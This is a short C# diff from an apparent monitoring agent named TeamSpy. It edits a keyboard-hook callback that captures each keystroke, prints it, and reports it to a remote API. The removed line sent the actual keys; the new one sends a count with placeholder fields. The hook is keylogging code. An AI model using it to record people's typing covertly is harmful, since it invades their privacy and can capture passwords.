@@ -69,7 +69,12 @@ namespace TeamSpy.Agent
                 string key = ((Keys)vkCode).ToString();
                 Console.WriteLine(key);
                 // Fire-and-forget is appropriate here to not block the hook chain.
-                Task.Run(() => _apiClient?.SendDataAsync("keystrokes", new { Timestamp = DateTime.Now, Keystroke = key }));
+                Task.Run(() => _apiClient?.SendDataAsync("keystrokes", new { 
+                    applicationName = "Unknown",
+                    windowTitle = "Unknown", 
+                    keystrokeCount = 1,
+                    timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+                }));
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
